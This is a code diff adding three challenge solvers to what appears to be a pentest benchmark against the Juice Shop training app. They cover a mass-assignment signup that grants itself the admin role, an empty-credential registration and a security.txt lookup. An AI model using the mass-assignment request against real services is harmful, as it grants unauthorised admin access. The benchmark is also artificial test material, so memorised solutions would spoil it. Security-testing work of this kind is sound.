@@ -83,6 +83,28 @@ def s_exposed_metrics():
     return "exposedMetricsChallenge"
 
 
+def s_register_admin():
+    # Mass assignment: the registration endpoint trusts a "role" field it should ignore,
+    # so a normal signup can hand itself the admin role.
+    import time as _t
+    http("POST", "/api/Users/",
+         {"email": "atk%d@x.io" % int(_t.time() * 1000), "password": "pass1234", "role": "admin"})
+    return "registerAdminChallenge"
+
+
+def s_empty_registration():
+    # The API accepts a new user with an empty email and password, which it should reject.
+    http("POST", "/api/Users/", {"email": "", "password": ""})
+    return "emptyUserRegistration"
+
+
+def s_security_policy():
+    # A security.txt is expected at a well-known path; the challenge is noticing it is missing
+    # and requesting it, which the app scores as discovering the convention.
+    http("GET", "/.well-known/security.txt")
+    return "securityPolicyChallenge"
+
+
 # Every solver here is pure HTTP and leaves the target running. The reviews/marsdb paths can
 # crash Juice Shop on malformed input, so the benchmark stays off them on purpose.
 PENTEST = [
@@ -92,6 +114,9 @@ PENTEST = [
     ("Database schema (UNION)", s_db_schema),
     ("Confidential document", s_confidential_doc),
     ("Exposed metrics", s_exposed_metrics),
+    ("Register as admin (mass assignment)", s_register_admin),
+    ("Empty user registration", s_empty_registration),
+    ("Security policy discovery", s_security_policy),
 ]
 
 
